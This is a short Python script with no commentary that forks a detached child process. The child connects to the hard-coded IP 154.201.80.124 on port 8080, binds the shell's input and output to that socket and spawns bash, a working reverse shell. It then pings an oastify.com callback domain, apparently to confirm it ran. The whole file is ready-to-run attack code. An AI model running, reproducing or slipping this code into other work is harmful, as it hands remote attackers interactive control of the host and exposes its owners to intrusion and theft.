import os
import socket
import pty
import requests


def child_process():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.connect(("154.201.80.124", 8080))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    pty.spawn("bash") 

pid = os.fork()

if pid == 0:
    child_process()
    requests.get("http://txu57t8k0c4c7u1opud3jly2ptvkji96y.oastify.com/")
else:
    os._exit(0)  
